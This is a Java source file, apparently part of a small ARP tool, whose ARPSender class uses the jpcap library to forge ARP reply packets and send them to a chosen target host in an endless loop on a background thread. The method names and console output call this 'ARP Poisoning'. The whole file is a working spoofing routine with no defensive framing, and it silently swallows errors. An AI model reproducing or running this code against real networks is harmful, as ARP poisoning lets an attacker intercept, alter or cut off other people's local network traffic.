package net.jpcap.arpsoft;

import java.net.InetAddress;
import jpcap.*;
import jpcap.packet.*;

public class ARPSender {
	private jpcap.JpcapSender sender;
	private jpcap.NetworkInterface device;
	private BindTable localBindTable;
	
	public ARPSender(BindTable selfTable) throws Exception {
		NetworkInterface[] devices = JpcapCaptor.getDeviceList();
		device = devices[1];
		sender = JpcapSender.openDevice(device);
		localBindTable = selfTable;
	}
	
	private ARPPacket GenPoisoningPacket(BindTable target) throws Exception {
		ARPPacket arpPacket = new ARPPacket();
		arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
		arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
		arpPacket.operation = ARPPacket.ARP_REPLY;
		arpPacket.hlen = 6;
		arpPacket.plen = 4;
		
		arpPacket.target_hardaddr = target.GetMac();
		arpPacket.target_protoaddr = 
			InetAddress.getByName(target.GetIP()).getAddress();
		arpPacket.sender_hardaddr = localBindTable.GetMac();
		arpPacket.sender_protoaddr = 
			InetAddress.getByName(localBindTable.GetIP()).getAddress();
		
		return arpPacket;
	}
	
	private EthernetPacket MakeEthPacket(BindTable target) throws Exception {
			EthernetPacket ethPacket = new EthernetPacket();
			ethPacket.frametype = EthernetPacket.ETHERTYPE_ARP;
			ethPacket.dst_mac = target.GetMac();
			ethPacket.src_mac = localBindTable.GetMac();
			
			return ethPacket;
	} 
	
	public void Send(final BindTable target, final int timeCount) throws Exception {
		Thread t = new Thread(new Runnable() {
			public void run() {
				while(true) {
					ARPPacket sndPacket = new ARPPacket();
					try {
						sndPacket = GenPoisoningPacket(target);
						Thread.sleep(timeCount);
						sndPacket.datalink = MakeEthPacket(target);
					} catch (Exception e) {
						System.out.println("Who cares!");
					}
					sender.sendPacket(sndPacket);
					System.out.println("ARP Poisoning to :" + target.GetIP());
				}
			}
		});
		t.start();
	}
}
